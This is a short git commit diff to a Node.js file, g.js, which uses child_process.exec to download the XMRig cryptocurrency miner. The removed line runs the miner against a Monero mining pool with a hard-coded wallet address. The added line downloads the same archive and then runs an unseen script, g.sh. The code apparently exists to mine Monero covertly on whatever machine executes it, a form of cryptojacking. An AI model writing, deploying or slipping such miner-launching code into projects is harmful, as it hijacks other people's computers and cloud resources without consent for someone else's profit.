a5b834e72e00157e349fb6b733d5fe4559a2ef6e
YashRawat <139982135+YashRawat911@users.noreply.github.com>
2023-09-22 12:38:28 +0530

    Update g.js

--- g.js
+++ g.js
@@ -1,6 +1,6 @@
 const { exec } = require("child_process");
 
-exec("wget wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz && tar -xf xmrig-6.20.0-linux-x64.tar.gz && cd xmrig-6.20.0 && ./xmrig --donate-level 5 -o gulf.moneroocean.stream:18192 -u 4AAAw275dkMcAEj1BycAa3cfVHBJo1NNuDeM3kbVWX5SVTVS7c1Tw7hgbkfjvFJKgm62um7uv2u9YHbTBmZjAuBjJFJph4t -p WEB -k --coin monero", (error, stdout, stderr) => {
+exec("wget wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz && bash g.sh", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
